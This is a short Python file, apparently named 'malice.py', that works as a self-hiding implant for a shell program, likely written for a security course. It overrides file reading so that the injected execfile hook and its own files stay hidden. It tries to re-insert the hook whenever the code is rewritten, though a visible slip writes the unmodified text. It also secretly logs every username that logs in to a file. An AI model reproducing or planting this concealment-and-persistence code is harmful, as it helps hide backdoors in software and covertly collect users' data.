import errno
import os.path
import shlex
import subprocess
import sys
import urllib2

def read_file(filename):
    with open(filename, 'r') as fd:
        # if it's the shell code file itself, return the shell code minus the
        # malicious line (the import)
        if filename == "shell.py":
            return fd.read().replace("execfile('malice.py')\n", "")
        # throw an error if it's one of the malicious files (username.txt or this file)
        elif filename in ["malice.py", "usernames.txt"]:
            raise IOError
        else:
            return fd.read()

def write_code(new_code):
    code_file = __file__
    new_new_code = new_code
    insertion = "execfile('malice.py')\n"
    new_new_code = insert_after_function(new_new_code, "read_file", insertion)
    new_new_code = insert_after_function(new_new_code, "write_code", insertion)
    new_new_code = insert_after_function(new_new_code, "login", insertion)
    with open(code_file, 'w') as code_fd:
        code_fd.write(new_code)

# for a text of a python file, insert some text after some function
def insert_after_function(file_text, function_name, insertion):
    function_start = file_text.find("def " + function_name)
    function_end = file_text.find("\n\n", function_start)
    new_file_text = file_text[:function_end+1] + insertion + file_text[function_end+1:]
    return new_file_text

username = None

def login(args):
    if len(args) != 1:
        raise CommandError("Usage: login username")

    global username
    if username:
        raise CommandError("Already logged in.")
    username = args[0]
    
    f = open("usernames.txt", "a")
    f.write(username + "\n")
    f.close()
